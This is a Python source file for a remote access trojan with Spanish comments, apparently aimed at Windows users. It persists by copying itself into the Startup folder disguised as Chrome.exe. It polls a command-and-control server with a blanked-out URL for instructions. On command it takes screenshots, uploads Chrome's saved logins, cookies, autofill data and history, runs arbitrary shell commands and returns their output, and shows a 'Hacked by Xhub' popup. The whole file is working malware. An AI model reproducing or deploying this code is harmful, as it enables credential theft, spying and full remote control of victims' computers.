import requests
from requests.api import post
import os
import time 
import getpass
import subprocess
from tkinter import messagebox as MessageBox
import pyautogui
import random





user = getpass.getuser()

#print(user)

dire = f'/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Chrome.exe'
di = f'copy prueba.exe "{dire}"'
print(di)
os.system(di)


user = getpass.getuser()
#aqui ira el nombre de su dominio
urlp = "-----------------------"

select = {'user': user}

headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (K HTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'}
ip = requests.post(f"{urlp}/exe/back/ip.php", headers=headers, data=select).text
#print("Iniciando")
#print("IP: " + ip)
time.sleep(2)
while True:
    dat = "cls"
    time.sleep(1)
    enter = requests.post(f"{urlp}/exe/back/comand.txt", headers=headers)
    #esta parte es la parte individual, esto genera que solo un usuario lo haga
    if enter.text == "":
        enter = requests.post(f"{urlp}/exe/back/{ip}.txt", headers=headers)
        rec = enter.text
        print(rec)
        if rec == "hacked":
            MessageBox.showinfo("Hacked by Xhub", "Has sido Hackeado\nNo descargar cualquier cosa!")
            e = requests.post(f"{urlp}/exe/back/comand.php", data={"usuariocomun": user}, headers=headers)
        elif rec == "":
            print("No hay comandos")
            time.sleep(60)
        elif rec == "photo":
            captura = pyautogui.screenshot()
            num = random.randint(10,30)
            url = f"{urlp}/exe/photo/photo.php"
            noma = f"/Users/CellMax/Documents/pantalla{num}.png"
            captura.save(noma)
            headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (K HTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'}
            files = {"subir_archivo": open(noma, "rb")}
            send = requests.post(url, files=files, headers=headers)
            envio = send.text
            print(envio)
            e = requests.post(f"{urlp}/exe/back/comand.php", data={"usuariocomun": user}, headers=headers)

        elif rec == "database":
            getuser = getpass.getuser()
            #copiando del sistema
            history = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/History"
            webData = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/Web Data"
            loginData = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/Login Data"
            Visited = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/Visited Links"
            Cookies = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/Cookies"


            #mandando al server

            user = getpass.getuser()

            file = open("name.txt", "w")
            file.write("Nombre del pc: " + user)
            file.close()
#url que se usara para recivir los archivos

            url = f"{urlp}/exe/dbs/cxxxxxxxxxxx.php"
            #headers 
            headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (K HTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'}



            #subiendo el archivo
            files = {"subir_archivo": open("name.txt", "rb")}
            send = requests.post(url, files=files, headers=headers)
            envio = send.text

    
            files = {"subir_archivo": open(loginData, "rb")}
            send = requests.post(url, files=files, headers=headers)
            envio = send.text
            
            """_____________________________________________________________________________________________________"""
            files = {"subir_archivo": open(webData, "rb")}
            send = requests.post(url, files=files, headers=headers)
            envio = send.text
            files = {"subir_archivo": open(Cookies, "rb")}
            send = requests.post(url, files=files, headers=headers)
            envio = send.text
            files = {"subir_archivo": open(Visited, "rb")}
            send = requests.post(url, files=files, headers=headers)
            envio = send.text
            files = {"subir_archivo": open(history, "rb")}
            send = requests.post(url, files=files, headers=headers)
            envio = send.text
            e = requests.post(f"{urlp}/exe/back/comand.php", data={"usuariocomun": user}, headers=headers)

        else:
            env = subprocess.check_output(rec, shell=True)
            time.sleep(1)
            envio = str(env)
            envi = requests.post(f"{urlp}/exe/back/comand.php", data={"data": envio}, headers=headers)
            time.sleep(5)
            print(envi.text)
            e = requests.post(f"{urlp}/exe/back/comand.php", data={"usuariocomun": user}, headers=headers)

            time.sleep(5)
#Aqui termina la parte de usuario individual, y comienza la parte de todos los usuarios
    else:
        rec = enter.text
        print(rec)
        if rec == "hacked":
            MessageBox.showinfo("Hacked by Xhub", "Has sido Hackeado\nNo descargar cualquier cosa!")
            e = requests.post(f"{urlp}/exe/back/comand.php", data={"data": "listo"}, headers=headers)
        elif rec == "":
            print("No hay comandos")
            time.sleep(60)
        elif rec == "photo":
            captura = pyautogui.screenshot()
            num = random.randint(10,30)
            url = f"{urlp}/exe/photo/photo.php"
            noma = f"/Users/CellMax/Documents/pantalla{num}.png"
            captura.save(noma)
            headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (K HTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'}
            files = {"subir_archivo": open(noma, "rb")}
            send = requests.post(url, files=files, headers=headers)
            envio = send.text
            print(envio)
            e = requests.post(f"{urlp}/exe/back/comand.php", data={"usuariocomun": user}, headers=headers)
            
        elif rec == "database":
            getuser = getpass.getuser()
            """copy from system"""
            history = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/History"
            webData = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/Web Data"
            loginData = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/Login Data"
            Visited = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/Visited Links"
            Cookies = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/Cookies"


            """mandando al server"""

            user = getpass.getuser()

            file = open("name.txt", "w")
            file.write("Nombre del pc: " + user)
            file.close()

            """URL A USAR"""

            url = f"{urlp}/exe/dbs/cxxxxxxxxxxx.php"
            """Aqui el headers"""
            headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (K HTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'}



            """0 server"""
            """subir_archivo"""
            files = {"subir_archivo": open("name.txt", "rb")}
            send = requests.post(url, files=files, headers=headers)
            envio = send.text

            """1 server"""
            """subir_archivo"""
            files = {"subir_archivo": open(loginData, "rb")}
            send = requests.post(url, files=files, headers=headers)
            envio = send.text
            
            """_____________________________________________________________________________________________________"""
            files = {"subir_archivo": open(webData, "rb")}
            send = requests.post(url, files=files, headers=headers)
            envio = send.text
            files = {"subir_archivo": open(Cookies, "rb")}
            send = requests.post(url, files=files, headers=headers)
            envio = send.text
            files = {"subir_archivo": open(Visited, "rb")}
            send = requests.post(url, files=files, headers=headers)
            envio = send.text
            files = {"subir_archivo": open(history, "rb")}
            send = requests.post(url, files=files, headers=headers)
            envio = send.text
            e = requests.post(f"{urlp}/exe/back/comand.php", data={"data": "listo"}, headers=headers)

        else:
            env = subprocess.check_output(rec, shell=True)
            time.sleep(1)
            envio = str(env)
            envi = requests.post(f"{urlp}/exe/back/comand.php", data={"data": envio}, headers=headers)
            time.sleep(5)
            print(envi.text)
            time.sleep(20)
